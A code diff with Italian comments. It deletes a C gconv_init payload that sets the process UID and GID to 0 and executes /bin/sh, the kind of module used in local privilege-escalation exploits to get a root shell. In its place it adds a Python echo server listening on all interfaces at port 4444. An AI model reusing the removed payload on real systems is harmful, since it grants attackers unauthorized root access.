@@ -1,14 +1,29 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>    // Per setuid(), setgid(), setgroups(), execve()
-#include <sys/types.h> // Per setuid(), setgid(), setgroups()
+#!/usr/bin/env python3
+import socket
 
-void gconv() {}
+# Impostazioni di configurazione
+HOST = '0.0.0.0'  # Ascolta su tutte le interfacce di rete
+PORT = 4444        # La porta su cui ascoltare
 
-void gconv_init() {
-    setuid(0);     // Imposta l'UID del processo a 0 (root)
-    setgid(0);     // Imposta il GID del processo a 0 (root)
-/// setgroups(0);  // Imposta i gruppi del processo (se necessario)
+# Crea il socket TCP/IP
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    # Associa il socket alla porta specificata
+    s.bind((HOST, PORT))
+    # Inizia ad ascoltare le connessioni
+    s.listen(1)
+    print(f"Mi metto in ascolto sulla porta {PORT}...")
 
-    execve("/bin/sh", NULL, NULL); // Esegue la shell
-}
+    while True:
+        # Accetta una connessione
+        conn, addr = s.accept()
+        with conn:
+            print(f"Connessione ricevuta da {addr}")
+            while True:
+                # Ricevi i dati
+                data = conn.recv(1024)
+                if not data:
+                    # Se non ci sono più dati, termina la connessione
+                    break
+                print(f"Dati ricevuti: {data.decode('utf-8')}")
+                # Invia di nuovo i dati al client (echo)
+                conn.sendall(data)
